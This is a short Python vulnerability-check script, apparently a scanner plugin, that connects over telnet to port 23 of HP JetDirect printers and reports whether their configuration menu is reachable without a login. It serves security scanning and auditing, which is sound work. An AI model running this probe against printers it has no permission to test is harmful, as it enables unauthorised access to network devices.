#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 惠普打印机telnet未授权访问
referer: http://www.wooyun.org/bugs/WooYun-2015-162704
author: Lucifer
description: 惠普打印机默认开放23端口存在未授权访问。
'''
import sys
import telnetlib
from urllib.parse import urlparse

class printer_hp_jetdirect_unauth_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        port = 23
        if r"http" in self.url:
            #提取host
            host = urlparse(self.url)[1]
            try:
                port = int(host.split(':')[1])
            except:
                pass
            flag = host.find(":")
            if flag != -1:
                host = host[:flag]
        else:
            host = self.url

        try:
            #连接Telnet服务器
            tlib = telnetlib.Telnet(host, port, timeout=6)
            #tlib.set_debuglevel(2)
            #登陆
            tlib.read_until(b">", timeout=6)
            tlib.write(b"/\r\n")
            result = tlib.read_until(b"zrinfo>", timeout=6)
            tlib.close()
            if result.find(b"Printer Telnet Configuration") is not -1 and result.find(b"IP Config Method") is not -1:
                return "[+]存在惠普打印机telnet未授权访问漏洞...(高危)\tpayload: "+host+":"+str(port)
            else:
                return "[-]no vuln"
        except:
            return "[-] ======>连接超时"

if __name__ == "__main__":
    testVuln = printer_hp_jetdirect_unauth_BaseVerify(sys.argv[1])
    testVuln.run()